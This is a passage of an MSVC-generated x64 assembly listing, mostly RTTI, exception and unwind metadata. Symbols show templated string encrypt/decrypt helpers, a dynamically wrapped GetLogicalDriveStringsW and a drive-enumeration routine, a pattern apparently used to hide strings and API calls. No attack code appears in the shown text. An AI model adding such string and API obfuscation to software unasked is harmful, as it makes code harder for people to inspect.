_RTC_Shutdown.rtc$TMZ DQ FLAT:_RTC_Shutdown
rtc$TMZ	ENDS
;	COMDAT rtc$IMZ
rtc$IMZ	SEGMENT
_RTC_InitBase.rtc$IMZ DQ FLAT:_RTC_InitBase
rtc$IMZ	ENDS
;	COMDAT ??_R1A@?0A@EA@bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@bad_array_new_length@std@@8 DD imagerel ??_R0?AVbad_array_new_length@std@@@8 ; std::bad_array_new_length::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	02H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3bad_array_new_length@std@@8
rdata$r	ENDS
;	COMDAT ??_R2bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R2bad_array_new_length@std@@8 DD imagerel ??_R1A@?0A@EA@bad_array_new_length@std@@8 ; std::bad_array_new_length::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@bad_alloc@std@@8
	DD	imagerel ??_R1A@?0A@EA@exception@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R3bad_array_new_length@std@@8 DD 00H			; std::bad_array_new_length::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	03H
	DD	imagerel ??_R2bad_array_new_length@std@@8
rdata$r	ENDS
;	COMDAT ??_R4bad_array_new_length@std@@6B@
rdata$r	SEGMENT
??_R4bad_array_new_length@std@@6B@ DD 01H		; std::bad_array_new_length::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVbad_array_new_length@std@@@8
	DD	imagerel ??_R3bad_array_new_length@std@@8
	DD	imagerel ??_R4bad_array_new_length@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@bad_alloc@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@bad_alloc@std@@8 DD imagerel ??_R0?AVbad_alloc@std@@@8 ; std::bad_alloc::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3bad_alloc@std@@8
rdata$r	ENDS
;	COMDAT ??_R2bad_alloc@std@@8
rdata$r	SEGMENT
??_R2bad_alloc@std@@8 DD imagerel ??_R1A@?0A@EA@bad_alloc@std@@8 ; std::bad_alloc::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@exception@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3bad_alloc@std@@8
rdata$r	SEGMENT
??_R3bad_alloc@std@@8 DD 00H				; std::bad_alloc::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	imagerel ??_R2bad_alloc@std@@8
rdata$r	ENDS
;	COMDAT ??_R4bad_alloc@std@@6B@
rdata$r	SEGMENT
??_R4bad_alloc@std@@6B@ DD 01H				; std::bad_alloc::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVbad_alloc@std@@@8
	DD	imagerel ??_R3bad_alloc@std@@8
	DD	imagerel ??_R4bad_alloc@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@exception@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@exception@std@@8 DD imagerel ??_R0?AVexception@std@@@8 ; std::exception::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	00H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R2exception@std@@8
rdata$r	SEGMENT
??_R2exception@std@@8 DD imagerel ??_R1A@?0A@EA@exception@std@@8 ; std::exception::`RTTI Base Class Array'
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3exception@std@@8
rdata$r	SEGMENT
??_R3exception@std@@8 DD 00H				; std::exception::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	01H
	DD	imagerel ??_R2exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R4exception@std@@6B@
rdata$r	SEGMENT
??_R4exception@std@@6B@ DD 01H				; std::exception::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVexception@std@@@8
	DD	imagerel ??_R3exception@std@@8
	DD	imagerel ??_R4exception@std@@6B@
rdata$r	ENDS
;	COMDAT ??_C@_15GANGMFKL@?$AA?$CF?$AAs@
CONST	SEGMENT
??_C@_15GANGMFKL@?$AA?$CF?$AAs@ DB '%', 00H, 's', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1CE@KFOFEHDF@?$AAF?$AAo?$AAu?$AAn?$AAd?$AA?5?$AA?$CF?$AAd?$AA?5?$AAd?$AAr?$AAi?$AAv?$AAe?$AAs@
CONST	SEGMENT
??_C@_1CE@KFOFEHDF@?$AAF?$AAo?$AAu?$AAn?$AAd?$AA?5?$AA?$CF?$AAd?$AA?5?$AAd?$AAr?$AAi?$AAv?$AAe?$AAs@ DB 'F'
	DB	00H, 'o', 00H, 'u', 00H, 'n', 00H, 'd', 00H, ' ', 00H, '%', 00H
	DB	'd', 00H, ' ', 00H, 'd', 00H, 'r', 00H, 'i', 00H, 'v', 00H, 'e'
	DB	00H, 's', 00H, ':', 00H, ' ', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BA@JFNIOLAK@string?5too?5long@
CONST	SEGMENT
??_C@_0BA@JFNIOLAK@string?5too?5long@ DB 'string too long', 00H ; `string'
CONST	ENDS
;	COMDAT _CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24 DD 010H
	DD	imagerel ??_R0?AVbad_alloc@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0bad_alloc@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVbad_alloc@std@@@8
data$r	SEGMENT
??_R0?AVbad_alloc@std@@@8 DQ FLAT:??_7type_info@@6B@	; std::bad_alloc `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVbad_alloc@std@@', 00H
data$r	ENDS
;	COMDAT _CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24 DD 00H
	DD	imagerel ??_R0?AVbad_array_new_length@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0bad_array_new_length@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVbad_array_new_length@std@@@8
data$r	SEGMENT
??_R0?AVbad_array_new_length@std@@@8 DQ FLAT:??_7type_info@@6B@ ; std::bad_array_new_length `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVbad_array_new_length@std@@', 00H
data$r	ENDS
;	COMDAT _CTA3?AVbad_array_new_length@std@@
xdata$x	SEGMENT
_CTA3?AVbad_array_new_length@std@@ DD 03H
	DD	imagerel _CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24
	DD	imagerel _CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24
	DD	imagerel _CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
xdata$x	ENDS
;	COMDAT _TI3?AVbad_array_new_length@std@@
xdata$x	SEGMENT
_TI3?AVbad_array_new_length@std@@ DD 00H
	DD	imagerel ??1bad_array_new_length@std@@UEAA@XZ
	DD	00H
	DD	imagerel _CTA3?AVbad_array_new_length@std@@
xdata$x	ENDS
;	COMDAT _CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24 DD 00H
	DD	imagerel ??_R0?AVexception@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0exception@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVexception@std@@@8
data$r	SEGMENT
??_R0?AVexception@std@@@8 DQ FLAT:??_7type_info@@6B@	; std::exception `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVexception@std@@', 00H
data$r	ENDS
;	COMDAT ??_C@_0BF@KINCDENJ@bad?5array?5new?5length@
CONST	SEGMENT
??_C@_0BF@KINCDENJ@bad?5array?5new?5length@ DB 'bad array new length', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7bad_array_new_length@std@@6B@
CONST	SEGMENT
??_7bad_array_new_length@std@@6B@ DQ FLAT:??_R4bad_array_new_length@std@@6B@ ; std::bad_array_new_length::`vftable'
	DQ	FLAT:??_Ebad_array_new_length@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT ??_7bad_alloc@std@@6B@
CONST	SEGMENT
??_7bad_alloc@std@@6B@ DQ FLAT:??_R4bad_alloc@std@@6B@	; std::bad_alloc::`vftable'
	DQ	FLAT:??_Ebad_alloc@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT ??_C@_0BC@EOODALEL@Unknown?5exception@
CONST	SEGMENT
??_C@_0BC@EOODALEL@Unknown?5exception@ DB 'Unknown exception', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7exception@std@@6B@
CONST	SEGMENT
??_7exception@std@@6B@ DQ FLAT:??_R4exception@std@@6B@	; std::exception::`vftable'
	DQ	FLAT:??_Eexception@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z DD 025051301H
	DD	010e2313H
	DD	070070029H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Get_size_of_n@$01@std@@YA_K_K@Z DD 025051301H
	DD	010e2313H
	DD	070070025H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$min@_K@std@@YAAEB_KAEB_K0@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$max@_K@std@@YAAEB_KAEB_K0@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	045H
	DW	016dH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z DD 025054c19H
	DD	011d2322H
	DD	07016002dH
	DD	05015H
	DD	imagerel __GSHandlerCheck
	DD	0158H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcName$0 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
	DB	04eH
	DB	065H
	DB	077H
	DB	05fH
	DB	063H
	DB	061H
	DB	070H
	DB	061H
	DB	063H
	DB	069H
	DB	074H
	DB	079H
	DB	00H
	ORG $+2
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcName$1 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
	DB	04eH
	DB	065H
	DB	077H
	DB	05fH
	DB	070H
	DB	074H
	DB	072H
	DB	00H
	ORG $+7
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcVarDesc DD 088H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
	DD	08H
	DQ	FLAT:??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcName$1
	DD	048H
	DD	08H
	DQ	FLAT:??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcName$0
	ORG $+96
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcFrameData DD 02H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
	DD	00H
	DQ	FLAT:??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z DD 025052201H
	DD	011d2322H
	DD	070160021H
	DD	05015H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Convert_size@_K_K@std@@YA_K_K@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0131H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0445H
	DW	046fH
	DW	0499H
	DW	04c3H
	DW	04edH
	DW	0517H
	DW	0541H
	DW	056bH
	DW	0595H
	DW	05bfH
	DW	05e9H
	DW	0613H
	DW	061dH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?positive_modulo@@YAHHH@Z DD 025051601H
	DD	01112316H
	DD	0700a001dH
	DD	05009H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pGetLogicalDriveStringsW@@YAKKPEA_W@Z DD 025051701H
	DD	01122317H
	DD	0700b0021H
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?plstrlenW@@YAHPEB_W@Z DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z DD 025051301H
	DD	010e2313H
	DD	07007004dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0drive_info_@filesystem@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	040H
	DB	0f6H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z DD 025054719H
	DD	0118231dH
	DD	070110025H
	DD	05010H
	DD	imagerel __GSHandlerCheck
	DD	0118H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcName$0 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
	DB	04dH
	DB	061H
	DB	073H
	DB	06bH
	DB	065H
	DB	064H
	DB	00H
	ORG $+8
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcVarDesc DD 028H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
	DD	08H
	DQ	FLAT:?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcName$0
	ORG $+48
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcFrameData DD 01H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
	DD	00H
	DQ	FLAT:?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcVarDesc
CONST	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	036H
	DB	0c9H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ DD 025053d19H
	DD	010e2313H
	DD	070070031H
	DD	05006H
	DD	imagerel __GSHandlerCheck
	DD	0178H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcName$0 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
	DB	041H
	DB	06cH
	DB	06cH
	DB	06fH
	DB	063H
	DB	05fH
	DB	06dH
	DB	061H
	DB	078H
	DB	00H
	ORG $+5
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcVarDesc DD 028H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
	DD	08H
	DQ	FLAT:?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcName$0
	ORG $+48
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcFrameData DD 01H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
	DD	00H
	DQ	FLAT:?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
